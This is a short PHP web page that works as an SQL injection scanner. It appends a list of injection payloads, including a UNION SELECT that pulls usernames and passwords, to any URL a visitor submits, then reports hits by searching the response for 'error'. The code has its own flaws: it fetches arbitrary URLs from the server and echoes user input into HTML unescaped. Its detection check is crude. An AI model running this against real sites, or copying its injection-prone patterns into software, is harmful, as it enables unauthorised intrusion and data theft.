<?php
if (isset($_POST['url'])) {
    $url = $_POST['url'];
    $injections = [
        "' OR '1'='1",
        "' OR '1'='1' --",
        "' OR 1=1 --",
        "' OR '1'='1' /*",
        "' OR 1=1 /*",
        "' OR '1'='1' AND 1=1 --",
        "' OR '1'='1' AND '1'='2",
        "' OR '1'='1' AND 'a'='a",
        "' OR '1'='1' AND 'a'='b",
        "' OR '1'='1' UNION SELECT NULL, NULL --",
        "' OR '1'='1' UNION SELECT username, password FROM users --",
        "' OR '1'='1' UNION SELECT null, table_name FROM information_schema.tables --",
    ];

    echo "<h3>Testing URL: $url</h3>";
    echo "<ul>";

    foreach ($injections as $injection) {
        $test_url = $url . urlencode($injection);
        $response = file_get_contents($test_url);
        echo "<li>Test: <a href=\"$test_url\" target=\"_blank\">$test_url</a></li>";

        if (strpos($response, 'error') !== false || strpos($response, 'warning') !== false) {
            echo "<li style='color: red;'>Possible SQL Injection vulnerability detected with: $injection</li>";
        } else {
            echo "<li style='color: green;'>No SQL Injection vulnerability detected with: $injection</li>";
        }
    }

    echo "</ul>";
}
?>

<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SQL Injection Test</title>
</head>

<body>
    <h1>SQL Injection Test Page</h1>
    <form method="post">
        <label for="url">URL to test:</label>
        <input type="text" id="url" name="url" required>
        <button type="submit">Test</button>
    </form>
</body>

</html>